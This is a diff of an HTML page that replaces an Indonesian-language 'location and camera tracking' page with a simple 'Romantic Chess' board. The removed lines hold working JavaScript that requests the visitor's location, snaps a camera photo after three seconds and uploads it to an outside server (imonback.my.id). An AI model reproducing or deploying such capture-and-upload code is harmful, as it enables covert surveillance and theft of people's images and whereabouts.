@@ -3,86 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pelacakan Lokasi & Kamera</title>
+    <title>Romantic Chess</title>
+    <link rel="stylesheet" href="chessboard.css">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <h1>Pelacakan Lokasi & Kamera</h1>
-    <button id="trackButton">Lacak Lokasi & Ambil Foto</button>
-    <p id="locationInfo"></p>
-    <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <img id="capturedImage" alt="Hasil Foto" style="max-width: 100%; display: none;">
+    <h1>Romantic Chess ♡</h1>
+    <div id="board"></div>
+    <button onclick="resetGame()">Reset</button>
 
-    <script>
-        const trackButton = document.getElementById("trackButton");
-        const locationInfo = document.getElementById("locationInfo");
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const capturedImage = document.getElementById("capturedImage");
-
-        trackButton.addEventListener("click", async () => {
-            // Meminta izin lokasi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const { latitude, longitude } = position.coords;
-                        locationInfo.innerText = `Lokasi: ${latitude}, ${longitude}`;
-                    },
-                    (error) => {
-                        locationInfo.innerText = "Izin lokasi ditolak.";
-                    }
-                );
-            } else {
-                locationInfo.innerText = "Geolocation tidak didukung.";
-            }
-
-            // Meminta izin kamera dan mengambil foto otomatis
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.style.display = "block";
-
-                setTimeout(() => {
-                    // Ambil gambar dari video
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Konversi gambar ke format blob
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append("photo", blob, "photo.jpg");
-
-                        // Tampilkan hasil foto
-                        const imgUrl = URL.createObjectURL(blob);
-                        capturedImage.src = imgUrl;
-                        capturedImage.style.display = "block";
-
-                        // Kirim ke backend di Arenhost
-                        try {
-                            const response = await fetch("http://imonback.my.id/upload.php", {
-                                method: "POST",
-                                body: formData
-                            });
-
-                            if (response.ok) {
-                                console.log("Foto berhasil dikirim.");
-                            } else {
-                                console.error("Gagal mengirim foto.");
-                            }
-                        } catch (error) {
-                            console.error("Terjadi kesalahan:", error);
-                        }
-                    }, "image/jpeg");
-
-                    // Hentikan kamera setelah mengambil foto
-                    stream.getTracks().forEach(track => track.stop());
-                    video.style.display = "none";
-                }, 3000); // Ambil gambar setelah 3 detik
-            } catch (error) {
-                console.error("Izin kamera ditolak atau terjadi kesalahan.");
-            }
-        });
-    </script>
+    <script src="chess.js"></script>
+    <script src="chessboard.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
